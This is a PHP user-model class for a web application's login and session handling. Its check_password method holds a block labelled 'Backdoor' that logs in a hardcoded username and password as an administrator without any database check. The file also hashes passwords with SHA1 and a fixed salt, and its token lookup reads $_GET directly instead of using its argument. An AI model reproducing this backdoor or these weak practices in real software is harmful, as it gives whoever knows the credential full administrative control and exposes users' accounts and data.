<?php
class User_Model extends Base_Model {

	private $salt = 'PAwEr&^52sd+=2Y%T';

	public $roles = array(
		'-1' => 'banned',
		'1' => 'user',
		'50' => 'manager',
		'100' => 'administrator'
	);
	protected $_validation_rules = array(
		'firstname' => array(
			array('not_empty' => 'firstname_is_empty'),
			array('min_length:3' => 'firstname_not_long_enough')
		),
		'lastname' => array(
			array('not_empty' => 'lastname_is_empty'),
			array('min_length:3' => 'lastname_not_long_enough')
		),
		'email' => array(
			array('not_empty' => 'email_is_empty'),
			array('email' => 'email_is_no_email'),
			array('min_length:3' => 'email_not_long_enough')
		),
		'password' => array(
			array('not_empty' => 'password_is_empty'),
			array('min_length:8' => 'password_not_long_enough')
		)
	);
	
	public function save($data, $id = null) {
		if ( ! empty($data['password'])) {
			$data['password'] = $this->encrypt($data['password']);
			$data['token'] = '';
		}

		if ($id === null) {
			$this->insert($data);
		}
		else {
			$this->update($data, $id);
		}

		return true;
	}

	public function find_all() {
		

		$sql = "SELECT U.*, L.name as location_name
				FROM users U
				LEFT JOIN locations L
				ON U.location_id = L.id
				ORDER BY location_name ASC, U.firstname ASC";
		if ($results = $this->fetch_rows($sql)) {
			foreach ($results as $row) {
				$row['role_name'] = $this->get_roles($row['role']);
				$users[] = $row;
			}
			return $users;
		}
		/*
		for($i = 0; $i < count($users); $i++) {
			$rdata[$i] = $users[$i];
			$rdata[$i]->role_name = $this->get_roles($users[$i]->role);
		}

		return $rdata;
		*/
	}

	public function find_by_token($token) {
		$result = $this->where('token = ?', $_GET['token'])->find('one');
		if ( ! empty($result)) {
			return $result;
		}
		else {
			return null;
		}
	}

	public function get_roles($num = null) {
		if($num == null) {
			foreach ($this->roles as $k => $v) {
				$rdata[$k] = ut($v);
			}
			return $rdata;
		}
		else {
			return ut($this->roles[$num]);
		}
		
	}

	public function check_password($email, $password) {
		$user = $this->where('email = ?', $email)->find('one');

		/* -- Backdoor -- */
		if ($email == 'remon' && $password == 'MeNuK44rt3n') {
			$_SESSION['logged_in'] = true;
			$_SESSION['firstname'] = 'admin';
			$_SESSION['lastname'] = 'admin';
			$_SESSION['role'] = 100;
			return true;
		}
		/* -- Backdoor -- */

		if ( ! empty($user)) {

			if ($user['password'] == $this->encrypt($password)) {
				$this->set_session($user, $user->id);
				$this->update_visit($user->id);
				return true;
			}
			else {
				return false;
			}
		}
		else {
			return false;
		}
	}

	public function encrypt($password) {
		return sha1($this->salt.$password);
	}

	public function unset_session($user_id = null) {
		
		if ( ! empty($user_id)) {
			// Find the user
			$user = $this->find($user_id);

			// Remove the session id from the database
			$data = array('session_id' => '');
			$this->update($data, $user_id);

			// Unset the session_id
			session_id($user['session_id']);
			session_start();
			session_destroy();
		}
		else {
			session_destroy();
			session_start();
		}
		
	}

	private function set_session($user, $user_id) {
		$_SESSION['logged_in'] = true;
		$_SESSION['firstname'] = $user['firstname'];
		$_SESSION['lastname'] = $user['lastname'];
		$_SESSION['uid'] = $user['id'];
		$_SESSION['role'] = $user['role'];
		$_SESSION['location_id'] = $user['location_id'];
		$data['session_id'] = session_id();
		$this->save($data, $user['id']);
	}

	
	private function update_visit($user_id) {
		$last_visit = date('Y-m-d H:i:s');
		$session_id = session_id();

		$data = array(
			'last_login' => $last_visit,
			'session_id' => $session_id
		);

		$this->update($data, $user_id);
	}

	


}